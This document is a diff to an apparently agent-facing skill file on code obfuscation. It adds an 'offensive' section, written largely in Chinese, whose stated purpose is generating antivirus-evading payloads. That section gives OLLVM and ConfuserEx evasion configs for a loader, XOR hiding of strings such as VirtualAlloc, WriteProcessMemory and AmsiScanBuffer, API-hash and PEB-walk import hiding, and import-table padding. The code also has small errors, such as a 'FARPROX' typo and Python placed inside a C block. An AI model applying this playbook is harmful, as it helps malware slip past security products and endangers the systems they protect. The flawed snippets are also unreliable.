@@ -1,9 +1,7 @@
 ---
 name: code-obfuscation-deobfuscation
 description: >-
-  Code obfuscation analysis and deobfuscation playbook. Use when reversing
-  binaries protected by junk code, opaque predicates, self-modifying code,
-  control flow flattening, VM protection, or string encryption.
+  Code obfuscation & deobfuscation — both attack and defense perspectives. Use for: (1) REVERSE: identifying and defeating obfuscation in protected binaries; (2) OFFENSIVE: implementing compiler-level obfuscation (OLLVM), .NET obfuscation (ConfuserEx), string encryption, IAT hiding, and PE header modification for AV evasion.
 ---
 
 # SKILL: Code Obfuscation & Deobfuscation — Expert Analysis Playbook
@@ -12,6 +10,7 @@ description: >-
 
 ## 0. RELATED ROUTING
 
+- [av-evasion-orchestrator](../av-evasion-orchestrator/SKILL.md) — 免杀决策入口（当混淆用于免杀目的时，orchestrator 会路由到本 skill §11 攻击视角）
 - [anti-debugging-techniques](../anti-debugging-techniques/SKILL.md) when the obfuscated binary also has anti-debug layers
 - [symbolic-execution-tools](../symbolic-execution-tools/SKILL.md) when using angr/Z3 for automated deobfuscation
 - [vm-and-bytecode-reverse](../vm-and-bytecode-reverse/SKILL.md) for deep VM protector bytecode analysis
@@ -389,3 +388,293 @@ Obfuscated binary — how to approach?
 | Capstone | Disassembly library | Custom tooling |
 | IDA FLIRT | Function signature matching | Identify library code in stripped binaries |
 | Binary Ninja | Alternative disassembler with MLIL/HLIL | Automated analysis |
+
+---
+## 11. OFFENSIVE OBFUSCATION — Implementation Guide
+
+> **定位**: 前面章节教你**如何分析/去除混淆**（逆向），本章教你**如何实施混淆**（免杀攻击视角）。本章为 av-evasion-orchestrator 的子章节，用于生成免杀 Payload。
+
+### 11.1 OLLVM (Obfuscator-LLVM) — 编译配置与 Pass 选择
+
+OLLVM 是基于 LLVM 的代码混淆编译器，在编译阶段插入混淆 Pass，生成语义等价但二进制特征完全不同的代码。
+
+#### 安装与使用
+
+```bash
+# 克隆 OLLVM（推荐 fork: https://github.com/heroims/obfuscator 支持 LLVM 14.0+）
+git clone https://github.com/heroims/obfuscator.git
+cd obfuscator && mkdir build && cd build
+cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=OFF ../llvm
+make -j$(nproc)
+```
+
+#### 四大 Pass 详解与选择策略
+
+| Pass | 标志 | 混淆效果 | 性能开销 | 免杀价值 | 使用建议 |
+|---|---|---|---|---|---|
+| **控制流平坦化** | `-mllvm -fla` | 函数拆散为 switch-case 主分发器 | 中（~30%） | ★★★★★ | 必开，360/火绒最怕这个 |
+| **指令替换** | `-mllvm -sub` | 算术/逻辑指令替换为语义等价序列 | 低（~10%） | ★★★★ | 必开，破坏静态特征码最直接 |
+| **虚假控制流** | `-mllvm -bcf` | 插入永不执行的虚假分支（不透明谓词） | 中（~20%） | ★★★★ | 必开，使 CFG 分析复杂度暴增 |
+| **字符串加密** | `-mllvm -sobf` | 编译时加密所有字符串，运行时动态解密 | 低（~5%） | ★★★★★ | 必开，直接干掉字符串扫描检测 |
+
+#### 推荐编译配置（实战黄金配方）
+
+```bash
+# ─── 免杀标准配置（平衡性能与混淆强度）───
+x86_64-w64-mingw32-clang++ -O2 \
+    -mllvm -fla \                     # 控制流平坦化
+    -mllvm -sub \                     # 指令替换
+    -mllvm -bcf \                     # 虚假控制流
+    -mllvm -bcf_loop=3 \              # BCF 循环次数（默认1，建议3）
+    -mllvm -bcf_prob=40 \             # BCF 概率 40%（默认30）
+    -mllvm -sobf \                    # 字符串加密
+    loader.c -o loader.exe
+
+# ─── 极端混淆配置（性能换安全）───
+x86_64-w64-mingw32-clang++ -O1 \
+    -mllvm -fla \
+    -mllvm -split \                   # 基本块拆分（可选，配合 fla）
+    -mllvm -split_num=3 \             # 每块拆分为3块
+    -mllvm -sub \
+    -mllvm -sub_loop=3 \              # 指令替换循环3次
+    -mllvm -bcf \
+    -mllvm -bcf_loop=3 \
+    -mllvm -bcf_prob=50 \
+    -mllvm -sobf \
+    loader.c -o loader_extreme.exe
+
+# ─── 轻量混淆（快速验证用）───
+x86_64-w64-mingw32-clang++ -O2 \
+    -mllvm -sub \
+    -mllvm -sobf \
+    loader.c -o loader_lite.exe
+```
+
+**踩坑提示**: 
+- 360 对 MSVC 的 `/O2 + /Ob2` 优化有特征 → OLLVM 编译可完全避开
+- 部分杀软对 OLLVM 编译产物的高熵值敏感 → 混入正常代码（printf、合法 API 调用）降低熵
+- 不要在 `-O0` 下使用 OLLVM → 混淆前先优化（`-O1` 及以上）
+
+### 11.2 ConfuserEx — .NET 混淆预设与自定义规则
+
+```xml
+<!-- ConfuserEx 免杀配置模板 (confuser.cr) -->
+<project outputDir="obfuscated" baseDir="src">
+    <module path="tool.exe">
+        <!-- 1. 重命名混淆：所有类/方法/字段用不可读字符重命名 -->
+        <rule pattern="true" inherit="false">
+            <protection id="rename" />
+        </rule>
+
+        <!-- 2. 控制流混淆：破坏 IL 逻辑结构 -->
+        <rule pattern="true">
+            <protection id="ctrl flow">
+                <argument name="intensity" value="70" />  <!-- 强度 70% -->
+            </protection>
+        </rule>
+
+        <!-- 3. 常量加密：隐藏内联字符串和常量 -->
+        <rule pattern="true">
+            <protection id="constants" />
+        </rule>
+
+        <!-- 4. 资源加密：加密嵌入的 DLL/配置文件 -->
+        <rule pattern="true">
+            <protection id="resources" />
+        </rule>
+
+        <!-- 5. 反调试：检测调试器附加 -->
+        <rule pattern="true">
+            <protection id="anti debug" />
+        </rule>
+
+        <!-- 6. 反篡改：检测二进制修改 -->
+        <rule pattern="true">
+            <protection id="anti tamper" />
+        </rule>
+
+        <!-- 7. 无效元数据注入：灌入大量垃圾元数据 -->
+        <rule pattern="true">
+            <protection id="invalid metadata" />
+        </rule>
+
+        <!-- 8. 反射保护：隐藏反射调用 -->
+        <rule pattern="true">
+            <protection id="ref proxy" />
+        </rule>
+    </module>
+</project>
+```
+
+```bash
+# 运行混淆
+Confuser.CLI.exe -n confuser.cr
+```
+
+### 11.3 字符串加密 — 实现模板
+
+手动实现的字符串加密/解密，不依赖编译器 Pass，可嵌入任意项目：
+
+```c
+/**
+ * 编译时字符串加密宏（C/C++）
+ * 使用 XOR + 编译期常量，不留明文字符串在二进制中
+ *
+ * 使用: USE_ENCRYPTED_STRING("VirtualAlloc")
+ * 展开为: DecryptString("\x2A\x4B\x1C...", key)
+ */
+
+// 简单 XOR 加密/解密
+static __forceinline void XorDecrypt(char *data, size_t len, char key) {
+    for (size_t i = 0; i < len; i++) {
+        data[i] ^= key;
+    }
+}
+
+// 使用 EncryptedString 结构体自动解密
+typedef struct {
+    char *data;
+    size_t len;
+    char key;
+} EncryptedString;
+
+char *DecryptString(EncryptedString *es) {
+    char *plain = (char *)malloc(es->len + 1);
+    memcpy(plain, es->data, es->len);
+    XorDecrypt(plain, es->len, es->key);
+    plain[es->len] = '\0';
+    return plain;  // 调用方负责 free
+}
+
+// 预加密字符串（由 Python 脚本生成）:
+// key = rand_byte, encrypted = bytes([b ^ key for b in b"VirtualAlloc"])
+```
+
+```python
+# 字符串预加密脚本（编译前运行）
+# 输出 C 头文件，包含所有加密字符串
+
+import os, sys
+
+STRINGS_TO_ENCRYPT = [
+    "VirtualAlloc", "CreateThread", "WriteProcessMemory",
+    "kernel32.dll", "ntdll.dll", "NtAllocateVirtualMemory",
+    "amsi.dll", "AmsiScanBuffer",
+]
+
+def encrypt_string(s):
+    key = ord(os.urandom(1))
+    encrypted = ','.join(f'0x{b ^ key:02X}' for b in s.encode())
+    return f'{{(char[]){encrypted}, {len(s)}, 0x{key:02X}}}'
+
+print("// Auto-generated encrypted strings")
+for s in STRINGS_TO_ENCRYPT:
+    print(f"static EncryptedString _s_{s} = {encrypt_string(s)};")
+```
+
+### 11.4 IAT 隐藏 — 完整实现
+
+隐藏导入表 (Import Address Table) 使静态分析工具看不到敏感 API 调用：
+
+#### 方案 A: API 哈希化动态解析
+
+```c
+/**
+ * 通过 DJB2 哈希动态解析 API 地址
+ * 不在导入表中出现敏感函数名
+ */
+
+DWORD Djb2Hash(const char *str) {
+    DWORD hash = 5381;
+    int c;
+    while ((c = *str++)) {
+        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
+    }
+    return hash;
+}
+
+FARPROX GetProcAddressByHash(HMODULE hModule, DWORD dwHash) {
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)
+        ((BYTE *)hModule + pDos->e_lfanew);
+
+    DWORD dwExportRVA = pNt->OptionalHeader
+        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (!dwExportRVA) return NULL;
+
+    PIMAGE_EXPORT_DIRECTORY pExport =
+        (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hModule + dwExportRVA);
+
+    PDWORD pNames = (PDWORD)((BYTE *)hModule + pExport->AddressOfNames);
+    PWORD pOrdinals = (PWORD)((BYTE *)hModule + pExport->AddressOfNameOrdinals);
+    PDWORD pFunctions = (PDWORD)((BYTE *)hModule + pExport->AddressOfFunctions);
+
+    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
+        const char *pszName = (const char *)((BYTE *)hModule + pNames[i]);
+        if (Djb2Hash(pszName) == dwHash) {
+            return (FARPROC)((BYTE *)hModule + pFunctions[pOrdinals[i]]);
+        }
+    }
+    return NULL;
+}
+
+// 预计算哈希值（编译前运行）:
+// printf("VirtualAlloc:  0x%08X\n", Djb2Hash("VirtualAlloc"));
+// printf("CreateThread:  0x%08X\n", Djb2Hash("CreateThread"));
+
+// 使用:
+HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+pVirtualAlloc fnAlloc = (pVirtualAlloc)
+    GetProcAddressByHash(hKernel32, 0x91AFCA54);  // DJB2("VirtualAlloc")
+```
+
+#### 方案 B: 延迟导入 + 手动解析
+
+```c
+/**
+ * 完全移除特定 DLL 的导入条目，改为运行时手动加载
+ * 优点: 导入表中不出现 kernel32.dll → 静态分析看不到任何高危 API
+ * 实现: 通过 PEB 获取 kernel32 基址 → 手动解析导出表定位函数
+ */
+
+HMODULE GetKernel32Base() {
+    // 通过 PEB 的 InMemoryOrderModuleList 获取
+    // kernel32.dll 总是在 ntdll.dll 之后加载（第2个条目）
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+    PLIST_ENTRY head = &pPeb->Ldr->InMemoryOrderModuleList;
+    PLIST_ENTRY entry = head->Flink->Flink;  // 跳过自身 → ntdll → kernel32
+
+    PLDR_DATA_TABLE_ENTRY pEntry =
+        CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+    return (HMODULE)pEntry->DllBase;
+}
+```
+
+#### 方案 C: 伪造合法导入表
+
+```c
+/**
+ * 在 PE 导入表中添加大量合法导入（如 user32.dll、gdi32.dll 的数百个函数）
+ * 使敏感导入（kernel32!VirtualAlloc）被淹没在噪音中
+ * 实现: 使用 Python pefile 库脚本修改 PE
+ */
+
+# Python 脚本: 伪造导入表
+import pefile
+pe = pefile.PE("loader.exe")
+# 添加来自 user32.dll 的 200+ 个合法导入
+# 真实敏感 API 通过 §11.4 方案 A 动态解析
+pe.write("loader_fake_imports.exe")
+```
+
+### 11.5 混淆方案速查（攻击视角）
+
+| 目标 | 推荐工具 | 命令/配置 | 免杀效果 |
+|---|---|---|---|
+| C/C++ 编译器级混淆 | OLLVM | `clang -mllvm -fla -mllvm -sub -mllvm -bcf -mllvm -sobf` | ★★★★★ |
+| .NET 全功能混淆 | ConfuserEx | config 含 rename+ctrlflow+constants+resources | ★★★★ |
+| 字符串隐藏 | 手动 XOR/AES 加密宏 | 编译前 Python 加密脚本 + 运行时解密 | ★★★★★ |
+| IAT 隐藏 | API 哈希化 | DJB2/CRC32 哈希 + PEB 遍历导出表 | ★★★★★ |
+| PE 头修改 | Python pefile / C 手动修改 | Section 重命名 + Rich Header 清除 + 时间戳伪造 | ★★★☆ |
+| Go 二进制混淆 | garble | `garble -literals -tiny build` | ★★★☆ |
+| 运行时自修改 (SMC) | 手动实现 | 加密 .text 段 + 执行前解密 + 执行后加密 | ★★★★ |
